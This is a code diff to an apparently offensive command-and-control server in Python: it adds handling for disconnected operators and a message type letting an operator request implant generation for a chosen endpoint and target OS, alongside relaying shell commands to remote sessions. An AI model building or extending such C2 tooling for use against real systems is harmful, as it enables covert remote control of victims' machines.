@@ -82,7 +82,13 @@ class C2Server(object):
             message = operatorpb_pb2.Message()
             message.ParseFromString(data)
 
-            if message.message_type==operatorpb_pb2.Message.MessageType.SessionCmd:
+            if not data:
+                print("[+]Disconnected operator " + address[0] +":"+ str(address[1]))
+                operator.close()
+                self.operators.remove(operator)
+                break
+
+            elif message.message_type==operatorpb_pb2.Message.MessageType.SessionCmd:
                 session_cmd = operatorpb_pb2.SessionCmd()
                 session_cmd.ParseFromString(message.data)
 
@@ -97,22 +103,12 @@ class C2Server(object):
                     out = self._shell_session(command_str, session_id)
                     self._send_operator(out,operator,session_id)
 
-            elif message.message_type==operatorpb_pb2.Message.MessageType.ServerCmd:
-                server_cmd = operatorpb_pb2.ServerCmd()
-                server_cmd.ParseFromString(message.data)
+            elif message.message_type==operatorpb_pb2.Message.MessageType.Generate:
+                logging.info("Client requested to generate")
+                generate_cmd = operatorpb_pb2.Generate()
+                generate_cmd.ParseFromString(message.data)
+                self._generate(generate_cmd.endpoint, generate_cmd.target_os)
 
-                command_str = server_cmd.cmd.lower()
-
-                logging.info("Command: " + command_str)
-
-                if (command_str == "generate"):
-                    response = self._generate("127.0.0.1:31337", "linux")
-
-                else:
-                    print("[+]Disconnected operator " + address[0] +":"+ str(address[1]))
-                    operator.close()
-                    self.operators.remove(operator)
-                    break
 
 def main():
     C2Server()
